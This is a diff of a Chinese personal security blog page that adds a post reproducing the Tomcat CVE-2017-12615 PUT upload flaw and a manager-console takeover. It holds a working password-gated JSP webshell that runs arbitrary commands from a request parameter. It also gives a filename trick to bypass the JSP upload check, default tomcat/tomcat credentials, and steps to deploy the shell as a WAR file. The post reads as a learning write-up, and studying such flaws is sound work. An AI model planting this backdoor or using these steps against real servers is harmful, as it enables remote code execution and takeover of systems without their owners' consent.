@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="漏洞复现," />
 
 
 
@@ -86,16 +86,25 @@
 
 
 
-<meta name="description" content="自己选的路，跪着是走不完的">
-<meta property="og:type" content="website">
-<meta property="og:title" content="BEHIND THE GROWTH">
-<meta property="og:url" content="http://yoursite.com/archives/2018/index.html">
+<meta name="description" content="cve-2017-12615、tomcat管理后台getshell">
+<meta name="keywords" content="漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tomcat">
+<meta property="og:url" content="http://yoursite.com/2018/07/31/Tomcat/index.html">
 <meta property="og:site_name" content="BEHIND THE GROWTH">
-<meta property="og:description" content="自己选的路，跪着是走不完的">
+<meta property="og:description" content="cve-2017-12615、tomcat管理后台getshell">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/put1.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/shell.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/tomcatManager.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/manager.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/war.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/shell2.png">
+<meta property="og:updated_time" content="2018-07-31T09:28:12.572Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="BEHIND THE GROWTH">
-<meta name="twitter:description" content="自己选的路，跪着是走不完的">
+<meta name="twitter:title" content="Tomcat">
+<meta name="twitter:description" content="cve-2017-12615、tomcat管理后台getshell">
+<meta name="twitter:image" content="http://yoursite.com/2018/07/31/Tomcat/put1.png">
 
 
 
@@ -125,13 +134,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/archives/2018/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/07/31/Tomcat/"/>
 
 
 
 
 
-  <title>时间轴 | BEHIND THE GROWTH</title>
+  <title>Tomcat | BEHIND THE GROWTH</title>
   
 
 
@@ -150,7 +159,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -254,296 +263,226 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
+  <div id="posts" class="posts-expand">
+    
 
-      <span class="archive-page-counter">
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/31/Tomcat/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="WyyFree">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/hack.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BEHIND THE GROWTH">
+    </span>
+
+    
+      <header class="post-header">
+
         
         
+          <h1 class="post-title" itemprop="name headline">Tomcat</h1>
         
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-31T16:24:00+08:00">
+                2018-07-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
           
-        
-        嗯..! 目前共计 7 篇日志。 继续努力。
-      </span>
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
 
-      
-
-        
-        
-        
-
-        
+                
+                
+              
+            </span>
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2018">2018</h1>
-          </div>
-        
-        
 
-        
+          
+            
+          
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+          
+          
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/07/31/Tomcat/" itemprop="url">
-              
-                <span itemprop="name">Tomcat</span>
-              
-            </a>
-        
-      </h2>
+          
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-31T16:24:00+08:00"
-              content="2018-07-31" >
-          07-31
-        </time>
-      </div>
+          
 
-    </header>
-  </article>
+          
+              <div class="post-description">
+                  cve-2017-12615、tomcat管理后台getshell
+              </div>
+          
 
+        </div>
+      </header>
+    
 
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/07/29/日志分析/" itemprop="url">
-              
-                <span itemprop="name">日志分析</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-29T15:17:00+08:00"
-              content="2018-07-29" >
-          07-29
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
-        
-        
-        
+      
+        <p><hr></p>
+<center>
 
-        
-        
+<h2 id="CVE-2017-12615"><a href="#CVE-2017-12615" class="headerlink" title="CVE-2017-12615"></a>CVE-2017-12615</h2><p></p></center><p></p>
+<ul>
+<li>原理</li>
+</ul>
+<p>Tomcat配置了可写（readonly=false），导致我们可以往服务器写文件(PUT)<br>Tomcat版本：8.5.19</p>
+<pre><code>&lt;servlet&gt;
+    &lt;servlet-name&gt;default&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;
+    &lt;init-param&gt;
+        &lt;param-name&gt;debug&lt;/param-name&gt;
+        &lt;param-value&gt;0&lt;/param-value&gt;
+    &lt;/init-param&gt;
+    &lt;init-param&gt;
+        &lt;param-name&gt;listings&lt;/param-name&gt;
+        &lt;param-value&gt;false&lt;/param-value&gt;
+    &lt;/init-param&gt;
+    &lt;init-param&gt;
+        &lt;param-name&gt;readonly&lt;/param-name&gt;
+        &lt;param-value&gt;false&lt;/param-value&gt;
+    &lt;/init-param&gt;
+    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
+&lt;/servlet&gt;
+</code></pre><ul>
+<li>复现</li>
+</ul>
+<p>虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用<code>/</code>）来绕过了限制。<br>jsbWebshell</p>
+<pre><code>&lt;%
+    if(&quot;0617&quot;.equals(request.getParameter(&quot;pwd&quot;))){
+        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();
+        int a = -1;
+        byte[] b = new byte[2048];
+        out.print(&quot;&lt;pre&gt;&quot;);
+        while((a=in.read(b))!=-1){
+            out.println(new String(b));
+        }
+        out.print(&quot;&lt;/pre&gt;&quot;);
+    }
+%&gt;
+</code></pre><p><img src="/2018/07/31/Tomcat/put1.png" alt="PUT"><br>访问上传的后门<br><img src="/2018/07/31/Tomcat/shell.png" alt="shell"></p>
+<p><hr></p>
+<center>
 
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/07/29/入侵应急分析排查/" itemprop="url">
-              
-                <span itemprop="name">入侵应急分析排查</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-29T14:39:00+08:00"
-              content="2018-07-29" >
-          07-29
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
+<h2 id="Tomcat后台弱口令-amp-amp-后台getshell"><a href="#Tomcat后台弱口令-amp-amp-后台getshell" class="headerlink" title="Tomcat后台弱口令 &amp;&amp; 后台getshell"></a>Tomcat后台弱口令 &amp;&amp; 后台getshell</h2><p></p></center><p></p>
+<ul>
+<li>后台弱口令</li>
+</ul>
+<p>Tomcat后台：<a href="http://ip:8080/manager/html" target="_blank" rel="noopener">http://ip:8080/manager/html</a><br>弱口令：tomcat/tomcat<br>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。<br>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。<br><img src="/2018/07/31/Tomcat/tomcatManager.png" alt="conf"></p>
+<ul>
+<li>后台上传war getshell</li>
+</ul>
+<p>1、制作war包<br>将1.jsp压缩成zip格式，将zip重命名为war -&gt; 1.war<br>2、后台上传<br><img src="/2018/07/31/Tomcat/manager.png" alt="manager"><br><img src="/2018/07/31/Tomcat/war.png" alt="war"><br>3、访问1.jsp<br><img src="/2018/07/31/Tomcat/shell2.png" alt="shell"></p>
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/07/29/业务安全测试/" itemprop="url">
-              
-                <span itemprop="name">Web业务安全测试</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-29T14:16:00+08:00"
-              content="2018-07-29" >
-          07-29
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/07/20/struts2/" itemprop="url">
-              
-                <span itemprop="name">Struts2</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-20T14:17:00+08:00"
-              content="2018-07-20" >
-          07-20
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/07/09/jboss/" itemprop="url">
-              
-                <span itemprop="name">Jboss</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-09T16:30:00+08:00"
-              content="2018-07-09" >
-          07-09
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/07/05/weblogic/" itemprop="url">
-              
-                <span itemprop="name">Weblogic</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-05T14:12:00+08:00"
-              content="2018-07-05" >
-          07-05
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/漏洞复现/" <i class="fa fa-tag"></i> 漏洞复现</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/29/日志分析/" rel="next" title="日志分析">
+                <i class="fa fa-chevron-left"></i> 日志分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -551,6 +490,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -571,8 +514,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -636,6 +588,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2017-12615"><span class="nav-number">1.</span> <span class="nav-text">CVE-2017-12615</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat后台弱口令-amp-amp-后台getshell"><span class="nav-number">2.</span> <span class="nav-text">Tomcat后台弱口令 &amp;&amp; 后台getshell</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -791,6 +759,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
